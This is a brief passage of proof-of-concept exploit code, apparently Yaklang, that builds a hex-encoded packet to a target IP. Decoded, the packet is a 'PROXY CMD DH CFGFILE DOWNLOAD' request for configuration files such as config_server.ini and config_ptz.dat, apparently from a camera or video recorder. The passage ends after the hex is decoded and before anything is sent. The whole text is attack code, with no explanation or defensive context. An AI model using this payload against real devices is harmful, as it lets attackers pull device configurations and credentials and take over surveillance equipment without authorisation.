poc=func(ip,port){
    ip_hex="%x" % [ip] 

    data="741f4a84c8a8e4b3187fd2210800450000cc3e9a40004006d413ac1065756e31a7c7435b0bb985bc1df05b3ee83250187fa4c6cf0000f1f5eaf57400a400000000000000000000009000" +ip_hex+"0950524f585909434d440944480943464746494c4509444f574e4c4f4144093609636f6e6669675f7365727665722e696e6909657874656e64776f72642e74787409636f6e6669675f70747a2e64617409636f6e6669675f72696768742e64617409636f6e6669675f64672e64617409636f6e6669675f6275726e2e6461740a0a0a"

    send_data,err=codec.DecodeHex(data)
